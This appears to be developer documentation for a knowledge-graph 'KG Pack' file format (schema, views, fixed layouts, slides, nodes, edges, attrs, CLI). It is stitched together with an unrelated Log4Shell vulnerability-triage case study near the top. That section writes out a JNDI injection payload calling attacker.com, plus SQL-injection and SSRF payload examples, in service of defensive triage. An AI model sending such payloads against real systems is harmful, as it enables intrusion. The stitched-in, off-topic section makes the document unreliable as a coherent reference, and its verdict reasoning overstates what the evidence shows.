# Items Graphs

Default to KG Pack sidecars for new Knowledge Graphs. Use lite inline syntax when the graph is small and does not need sidecars, or when reading or editing an existing document that already has groups, nodes, edges, and attrs inside the fenced block; see `items-graphs-lite.md` for that case.

## Vulnerability Triage via Tool Dependencies: Log4Shell Case Study

### Problem: Distinguish True RCE from JNDI Evaluation

Finding ID 196767 triggered debate: DNS callbacks prove Log4j evaluates JNDI expressions, but no LDAP/RMI connect-back occurred. Is this TRUE POSITIVE (app is vulnerable) or FALSE POSITIVE (intermediary artifact)?

### Tool Chain & Dependencies

```
User query (tmp.txt)
  ↓
Check MCP connectivity
  ├─ GetVulnerabilityDetails (196767)
  │    ├─ → latestEvent.source: TEST_CASE (active replay, can prove exploitation)
  │    ├─ → latestEvent.testCaseMetadata.cwe: 917 (JNDI injection)
  │    ├─ → latestEvent.evidence.message: "no LDAP/RMI connect-back recorded"
  │    └─ → Assertion status: "failure" (inverted: test DETECTED vuln)
  │
  ├─ GetAllEnvironments → resolve "staging" string to UUID
  │    └─ envId: 6d94542c-209e-4d50-8b07-c1679b00f843
  │
  ├─ GetTracesForEndpoint (POST /identity/api/auth/signup)
  │    ├─ → Shows request flow: Cloudflare → levoai-protection → crapi-web
  │    ├─ → Headers: cf-ray, x-forwarded-for (multiple proxy layers)
  │    ├─ → Response: 200 OK, application/json
  │    └─ → Real traffic has normal payloads (not malicious)
  │
  └─ GetTestCaseAttachment (raw evidence)
       ├─ → assertions.status="failure" (vulnerability WAS demonstrated)
       ├─ → assertions.evidence.message: quotes "JNDI lookup was evaluated"
       ├─ → DNS callbacks from 4 IPs (104.211.x, 20.192.x) at staggered times
       └─ → No LDAP/RMI callback (code execution unproven)
```

### Critical Questions at Each Node

| Tool Call | Data Extracted | Question Answered | Decision Point |
|-----------|-----------------|-------------------|-----------------|
| GetVulnerabilityDetails | source field | Was this an active test or passive observation? | TEST_CASE → can prove real exploitation; passive → only observational |
| GetVulnerabilityDetails | evidence.message | What specifically did the test prove? | Quotes: "evaluated" vs "no LDAP/RMI" → distinguishes component vuln from exploitation |
| GetAllEnvironments | UUID lookup | Which staging environment? | Without correct envId, query returns null (wrong org) |
| GetTracesForEndpoint | network context | Who processes requests normally? | k8s_container_name shows Cloudflare/Levo/Java layers; DNS from unknown source |
| GetTestCaseAttachment | assertions.status | Inverted: failure=detection success | status="failure" proves test found something; "success" would mean secure behavior held |

### How Source Attribution Decides Verdict

The assertion status being "failure" means the test infrastructure detected JNDI evaluation. But the question remains: **Did the Java application make the DNS query, or did Levo's test harness/proxy layer?**

#### Evidence for Application (TRUE POSITIVE):
- Password field contains `${jndi:ldap://attacker.com}`
- Spring/Log4j might log request bodies or parameters
- When Log4j processes the log message, JNDI syntax is evaluated
- Multiple Azure IPs making queries suggests horizontal scaling (multiple Java instances)

#### Evidence for Intermediary (FALSE POSITIVE):
- Cloudflare and levoai-protection (nginx WAF) sit between client and app
- Real traffic shows no Log4Shell payloads (only test payloads trigger it)
- WAF might scan or pre-process input before it reaches Java
- Multiple IPs could be different proxy instances, not app backends

### Code Corroboration: Reading the Handler

Checked `/Users/yeshwanth/Code/Levo/demo-apps/crAPI/services/identity/src/main/java/com/crapi/controller/AuthController.java`:

```java
@PostMapping("/signup")
public ResponseEntity<CRAPIResponse> registerUser(@Valid @RequestBody SignUpForm signUpRequest) {
    CRAPIResponse registerUserResponse = userService.registerUser(signUpRequest);
    // Returns 200 + JSON
}
```

Service layer (`UserServiceImpl.java`):
```java
public CRAPIResponse registerUser(SignUpForm signUpRequest) {
    user = new User(signUpRequest.getEmail(), signUpRequest.getNumber(),
               encoder.encode(signUpRequest.getPassword()), ERole.ROLE_USER);
    logger.info("User registered successful with userId {}", user.getId()); // Safe parameterized logging
    ...
    smtpMailServer.sendMail(...); // Password never logged here
}
```

**Finding:** Password field is parameterized in safe logging. But Spring or earlier Log4j config layers might log raw request bodies. The application does NOT explicitly log the password, but framework-level logging (e.g., Spring request/response interceptors) might still trigger JNDI evaluation.

### The Verdict Resolution

**TRUE POSITIVE** because:
1. Assertion status="failure" proves JNDI evaluation occurred (inverted logic)
2. DNS callbacks confirm attacker-controlled hostname resolution
3. Even if LDAP/RMI didn't complete, the app IS vulnerable to Log4Shell
4. Remediation is mandatory: patch Log4j, not "ignore this finding"

**Why not FALSE POSITIVE:**
- Proxies don't typically evaluate JNDI (that's Java/Log4j-specific)
- If Levo's protection layer were evaluating it, all requests through it would show callbacks (not just test payloads)
- The correlation tokens in the evidence tie each payload to a specific callback

### Tool Limitations Encountered

| Limitation | Tool | Workaround |
|-----------|------|-----------|
| envId needs UUID, not string | GetVulnerabilityDetails | Called GetAllEnvironments first to resolve "staging" → UUID |
| Assertion status uninverted | Raw finding display | Consulted method description: security tests invert PASS/FAIL |
| Attachment exceeds 200KB | GetTestCaseAttachment | Parsed JSON from saved file via Python subprocess, not Read tool |
| DNS origin IP attribution unclear | GetTracesForEndpoint | Compared normal traffic IPs vs test callback IPs; found mismatch suggesting possible intermediary but inconclusive |

### Invariant: Evidence Chains for Injection Vulnerabilities

For injection (Log4Shell, SQLi, SSRF, etc.), require evidence of:
1. **Payload acceptance:** Input reaches the vulnerable component (shown by DNS callback)
2. **Expression evaluation:** Syntax is parsed and processed (shown by JNDI lookup attempt)
3. **Behavior change:** Output or side effect proves execution (missing here: no LDAP/RMI callback; would prove code execution)

This case has 1+2, missing 3. But 1+2 alone = component is vulnerable = patch it.

### Two Other Injection Applications

**SQL Injection (CWE-89):** Payload `' OR '1'='1` in login. Need evidence: (1) Query accepted, (2) WHERE clause altered, (3) unauthorized rows returned. Status="failure" alone isn't enough; inspect the response body for data leakage.

**SSRF (CWE-918):** Payload `http://localhost:8080/admin`. Need evidence: (1) Payload sent to internal endpoint, (2) Response from internal service (not 403/404), (3) Proof of access to restricted resource. Internal error messages alone don't prove access.

## Fence

Keep the rendered markdown fence tiny:

```markdown
```items
---
items_schema: roadmap.kg.schema
---
```
```

## Sidecars

```text
roadmap.kg/kg.schema   # metadata, common files, source aliases, purposeful views
roadmap.kg/kg.nodes    # markerless compact node ids, labels, unique inline attrs
roadmap.kg/kg.edges    # base markerless edge set
roadmap.kg/kg.attrs    # shared indexed node/edge attr assignments
roadmap.kg/kg.palette  # node/edge palettes as JSON payload
roadmap.kg/chapter-1.kg.edges  # optional story/topology edge source
```

## Schema

```text
@graph id=roadmap title=Roadmap
group_by=status
color_by=status
hover_attrs=desc,built,where
card_states="Not Done,Done,Deferred/Cancelled"

@sources
nodes=kg.nodes
attrs=kg.attrs
base:
	edges=kg.edges
chapter1:
	edges=chapter-1.kg.edges
chapter2:
	edges=kg.edges
	attrs:
		stage: [Draft, Review]
		owner: [Design, Eng]
palette=kg.palette

@grammar
path=../shared/roadmap.grammar

@relations
unlocks color=relation.unlocks
blocks color=relation.blocks
explains

@views
owners:
	source=base
	group_by=owner
	color_by=status
	caption="Find ownership gaps"
dependency:
	source=chapter1
	group_by=status
	edge_label_from=relation
	caption="Inspect flow"
```

- `@graph` names the graph and can continue on following unindented lines for default/base-view metadata like `group_by`, `color_by`, `hover_attrs`, and `card_states`.
- The default view is the base graph plus graph-level display settings. Do not point default at a projection, and do not rely on the first `@views` entry.
- Optional `card_states` defines the click-cycle for card completion state. Put it on its own line when you want the multiline graph header style.
- Prefer folder packs and point markdown to `items_schema: roadmap.kg/kg.schema`.
- Top-level `nodes=` and `attrs=` in `@sources` are common to every source.
- Source `edges=` can select a story/topology by edge endpoints.
- Source nested `attrs:` selects nodes organically by indexed attr groups. Multiple attr keys are ANDed; listed values inside one key are ORed.
- `base+dep` composes source aliases.
- `@relations` is optional edge-type vocabulary. Use it to document relation ids, attach default presentation such as `color`, and let CLI validation catch typos. Relation label text defaults to the relation id.
- `@grammar` is optional and names a declarative rules file (`path=` relative to the pack, or absolute) that layers *dialect* invariants on top of the generic structural checks. A grammar can enforce closed vocabularies (`closed_vocab`), directed spines over an ordered attr (`edge_direction`), relation cardinality (`edge_cardinality`), allowed endpoint kinds (`edge_endpoints`), and conditional attr presence (`requires_attr_when`). It stays out of the pack proper so one grammar is shared across many packs. No `@grammar` means structural checks only. See `scripts/validate_kg_pack.py` for the rule schema.
- `@views` are named read-only views. A view may group or filter nodes, change display settings, own slides, or combine those choices. It does not need `group_by`.
- A view accepts `context=active` (default), `context=latest`, or one exact context id. `active` follows the context selected by the request or UI; the other values select their resolved context when the view opens.
- A view inside a `.context` file belongs to that context and is visible there by default. Put cross-context visibility rules in `kg.schema`, not in the `.context` file.
- `group_by,color_by=status` expands to `group_by=status color_by=status`; `X,Y,Z=value` is valid for simple scalar values.
- Projection display controls may live on views: `hover_attrs`, `edge_color_by`, `edge_label_from`, `aggregate_edges`, `default_open_depth`, and spacing/layout keys.
- Panel sizing lives on the graph or a view: `node-card-width` and `filter-panel-width` both default to `20%` of the widget, so the panels keep their share on any screen. Any CSS length works (`30rem`, `440px`).
- `node-card-content-scale` draws the node card's details wider than the card and lets sideways scroll pan across it. Default `2`. Set `1` to turn it off.

### Context View Visibility

Reference a context-owned view as `<owner-context>/<view-id>` under `@view_visibility`:

```text
@view_visibility
ctx013/master-story:
	show_in=from:ctx013
ctx004/review:
	show_in=ids:ctx010,ctx011
ctx006/release-check:
	show_in=id_regex:"release-[0-9]+"
```

- `show_in=self` selects only the owner context. This is also the default when the schema has no rule for the view.
- `show_in=all` selects every context.
- `show_in=from:<context-id>` selects that context and every context with a later `seq`.
- `show_in=ids:<context-id>,<context-id>` selects only the listed contexts.
- `show_in=id_regex:<pattern>` uses a full regular-expression match against each context id. Use `from:` for sequence order.
- A matching view reads the selected context's graph data, not its owner's graph data.
- Unknown references, contexts, selectors, invalid patterns, and duplicate visible view ids stop pack loading with a named error.
- Matching views keep context `seq` order, then their authored order. When no context-owned view matches, schema views retain their compatibility fallback.

## Fixed Layouts

`layout=` replaces the free graph with a layout that places every node itself. Three exist: `sequence`, `layered`, and `matrix`.

Each layout owns its own keys and validates them. There is no shared grammar of `row=`/`col=` keys, because the same word would mean different things in different layouts. Write the keys of the layout you chose.

A view with a bad layout key fails alone. It keeps its place in the dropdown and draws an error card naming the problem, and every other view still renders. An unknown layout name is reported the same way.

Grouping controls are off in a fixed layout. The layout decides placement, so `group_by` on the same view has nothing to act on.

### `layout=sequence`

One lane per participant across the page, one row per edge down it.

```text
@views
render:
	source=render
	layout=sequence
	sequence_role=role
	sequence_phase=phase
	edge_color_by=role
```

- A lifeline is one tall node. Every participant is drawn exactly once, spanning the whole diagram, with its label in a cap at the top.
- Each edge meets a lifeline at a handle whose `offsetPct` is that edge's row. Both ends of a row share one offset, so every arrow is horizontal, and one lifeline takes as many handles as it has rows.
- Row order is the order the edges are written in the view's edge source. The pack states no step number, so declaration order is the only ordering the author gives.
- To tell one flow from another, point the view at its own edge file (`@sources`) and write that file in flow order.
- Lane order is the stage the node belongs to, then the order the nodes are written inside that stage.
- The step number rides on the edge label (`3 · checks`), so the view needs no gutter column.
- `sequence_role` names an edge attr. Value `standing` marks a rule that already holds: it carries no step number and draws dashed. Value `blocking` marks one step holding back another.
- `sequence_phase` names an edge attr. Runs of rows that share a value get a tinted band with a label on the left.
- Lanes are as wide as participants, so a large flow is wide. Pan, or split the flow across views.
- Slides work here with no extra keys. A slide's `nodes` select their lifelines, and a row lights up when both of its ends are in the slide. Name the step range in the slide title so the reader can find it on the page.
- Only this layout draws its arrows over the nodes, because a lifeline stands between the two ends of most rows.

### `layout=layered`

Horizontal bands down the page. A node's y is its band and nothing else.

```text
@views
layered:
	source=base
	layout=layered
	layered_tier=layer
	layered_order=surface,core,pipeline,extension,content
	layered_aside=configuration
	color_by=layer
```

- `layered_tier` names a node attr. Its values become the bands.
- `layered_order` lists the bands top to bottom. Omit it and the layout uses the order the values appear. Give it, and a value with no band is reported by name rather than dropped, so state the order once you know it.
- `layered_aside` lists values that leave the ladder for a band down the right side. Use it for a concern that touches every band, because putting such a node on one rung makes the rung lie.
- Direction then carries meaning on its own: down is the request going in, up is the answer coming back.
- A band grows to fit the longest label on its rung, so nothing clips.

### `layout=matrix`

A grid. Columns come from a node attr, rows from an edge attr.

```text
@views
matrix:
	source=base
	layout=matrix
	matrix_col=layer
	matrix_row=flow
	matrix_tint=14
	color_by=layer
```

- `matrix_col` names a **node** attr; `matrix_row` names an **edge** attr. A node lands in a cell when one of its edges carries that row value.
- `matrix_col_order` lists the columns. Omit it and the layout uses the order the values appear.
- A node touched by three rows is drawn three times. That duplication is the answer to "what does this row touch", not a defect. Each copy still selects and colours as the one node.
- Each cell is washed by its column colour and its row colour, so the composite names the intersection. Colours come from the pack: a column reads `node_color_palettes`, a row reads `edge_color_palettes`.
- `matrix_tint` sets the wash strength as a percentage. Default `14`, maximum `50`.
- An edge joins its endpoints inside one row, so arrows stay in their band. Hide them with the edge toggle to read the cells alone.
- An empty cell is drawn with a dashed edge. Read the empty cells first, because they say what a row never needs.
- A cell grows to hold its members, and a row to hold its fullest cell.

See `demo/vyasa-architecture.kg` for all three layouts over one pack, and `demo/browser-page-load.kg` for a sequence-only pack.

## Slides

Author new slide sequences inside `@views`. Each view owns zero or one ordered sequence, so one graph can keep several explanations:

```text
@views
project_story:
	context=latest
	group_by=status
	slides:
		intro: Why this graph matters
			nodes=n1,n2
			caption="Start with the goal"
			desc=|
				**Presenter frame**

				- First point to land
				- Follow-up question
```

- Slides preserve authored order and accept `id`, `title`, `nodes`, `caption`, and `desc` / `description`.
- Use the same multiline mini-Markdown form as node attrs; descriptions render Markdown in the KG slide card.
- Slide `nodes` are source node ids. Projected copies remain focusable through `__source_node_id`.
- A view without slides closes the slide controls. Changing views changes the active slide sequence.
- An unknown fixed context id is an error; do not fall back to `active` or `latest`.
- Keep top-level schema or context `@slides` only when maintaining an old pack. New packs put slides under `@views`.

## Nodes

`roadmap.kg.nodes` is markerless because the filename already declares record kind:

```text
b1: Apartment Building
	city=Hyderabad
	inherit=city
	p1: Yesh
		role=tenant
	d1: Bruno
		species=dog
c1: Honda City
	type=car
n1: Post matching
	summary=|
		**Why it works**

		- Preserves separate interest clusters
		- Avoids centroid blur
```

- Preferred format: `<id>: <label>` followed by indented `key=value` lines for unique attrs.
- For multiline mini-Markdown, write `key=|`, then indent every content line one level deeper than the attribute.
- Blank lines, lists, links, emphasis, and other supported Markdown survive into the rendered node card.
- The block ends at the next nonblank line whose indentation is equal to or shallower than the `key=|` line.
- Indented `<id>: <label>` lines are child nodes. Indented `key=value` lines are attrs.
- A node with child nodes becomes a real group/container node; leaf nodes remain task/card nodes.
- Node ids are global. Edges still reference ids, not paths.
- Duplicate node ids may merge only when the label matches and there is no parent conflict; conflicting labels or multiple parents are invalid.
- One-line `<id> <label> key=value ...` remains readable for tiny nodes, but avoid it for long text.
- Prefer compact sequential node ids like `n1`, `n2`, `n3`; labels carry human meaning and compact ids reduce tokens in edges and attr lists.
- Keep unique/descriptive attrs inline here: `summary`, `description`, `notes`, `rationale`.
- Attr inheritance is whitelist-only through `inherit=key1,key2`. The named parent attrs copy to descendants only when the child does not already define that key.
- Put `inherit=` before child nodes. Default is no attr inheritance.

## Edges

`roadmap.kg.edges` is markerless:

```text
e1: n1 -> n2 unlocks note="Requires auth"
e2: n2 -> n3 creates
```

- Format: `<edge_id>: <source> -> <target> <relation> key=value ...`
- One edge has one primary relation.
- Relation has no leading `:`; write `unlocks`, not `:unlocks`.
- Use another edge for another semantic relation between the same nodes.
- Keep unique edge attrs inline only when UI/CLI can query or display them; otherwise omit dead text attrs.

## Attrs

Use `roadmap.kg.attrs` for shared categorical assignments:

```text
@node_attrs
status:
  todo: n1
  done: n2 n3
owner:
  eng: n1 n2 n3
habit:
  Ask for disagreement: n4

@edge_attrs
confidence:
  high: e1
  medium: e2
```

- Attributes stored in `.kg.nodes` or `.kg.edges` are inline attrs. They are detail/search material, not default filter/group-by dimensions.
- Attributes stored in `.kg.attrs` are indexed/shared attrs. They are default filter/group-by dimensions.
- The rendered model and CLI cache merge both into one logical attr map.
- Prefer `.kg.attrs` when the same key/value applies to many records.
- Attr values before `:` are raw text; do not quote values with spaces unless they contain `:` or newlines.
- Prefer readable block form over long lines when values are descriptive text.
- Derived runtime metrics such as `rank`, `connectivity`, and `centrality` are special metrics, not indexed attrs.

## Runtime Filters And Grouping

- Filter panel defaults to indexed `.kg.attrs` keys.
- Custom `Group by` in the default view builds an ad hoc hierarchy from indexed attrs only.
- Custom grouping opens all generated groups, equivalent to `default_open_depth=-1`.

## Palette

`roadmap.kg.palette` uses JSON payload but the extension intentionally avoids `.json` so humans/LLMs treat it as generated or tooling-owned when appropriate:

```json
{
  "node_color_palettes": {
    "card_state": {
      "Not Done": "#94a3b8",
      "Done": "#22c55e",
      "Deferred/Cancelled": "#f97316"
    },
    "status": {
      "todo": "#f59e0b",
      "done": "#22c55e"
    }
  },
  "edge_color_palettes": {
    "relation": {
      "unlocks": "#2563eb",
      "blocks": "#dc2626"
    }
  }
}
```

- Card state colors come from `node_color_palettes.card_state`.
- The first card state is active text. Every later state is struck through with its palette color.

## Cache And CLI

- `roadmap.kg.cache` is generated, disposable lookup state. Do not hand edit it.
- LLM tools should query and mutate through the KG CLI/cache instead of reading every sidecar for small changes.
- For read-only questions across complete contexts, read `items-query.md` and use `vyasa kg-query <kg.schema> '<query>'`.
- Core queries: `get`, `neighbors`, `incoming`, `outgoing`, `list_by_attr`, `color_modes`, `filter_policy`, `hover_policy`, `projections`, `projection_groups`, `validate`, `compile`.
- Core mutations: `upsert_record`, `delete_record`, `bulk_set_attr`, `move_node`, `rename_id`, `upsert_edge`, `delete_edge`, palette updates, filter/hover policy updates, projection updates. The mutation surface is `scripts/kg_cli.py`.
- `bulk_set_attr` means one key/value patch applied to a selected set of nodes or edges.
- **Offline validation:** use `kgval <pack-or-mom-path>` when available; it aliases `scripts/validate_kg_pack.py <pack-or-mom-path>` and checks referential integrity without a running server — every edge endpoint and attr id resolves to a defined node, schema `@sources` files exist, the palette is valid JSON, and (when given a `.md`) the `items` fence points at the pack. Any consumer that emits KG Packs (e.g. the minutes-of-meeting skill) should call this rather than re-implementing format checks.
- **Dialect grammar:** when a pack's schema names an `@grammar`, the validator also enforces that grammar's invariants; pass `--grammar <path>` to point at one explicitly or override the schema's. Structural failures are errors (the pack renders wrong); grammar violations are warnings (the pack renders, but tells a dishonest story). The rule schema (`closed_vocab`, `edge_direction`, `edge_cardinality`, `edge_endpoints`, `requires_attr_when`) is documented at the top of `check_grammar()` in the script.

## Compatibility

- KG Pack is the default for new graphs and for converted legacy graphs.
- Backward compatibility is only with original inline `items`/`tasks` markdown syntax.
- Do not use JSONL or the previous compact integer ledger.
- Ticked/checked node state is runtime-local UI state keyed by `document_path` plus `persistence_id`; do not encode transient ticking as normal node attrs unless adding explicit persisted task completion semantics.
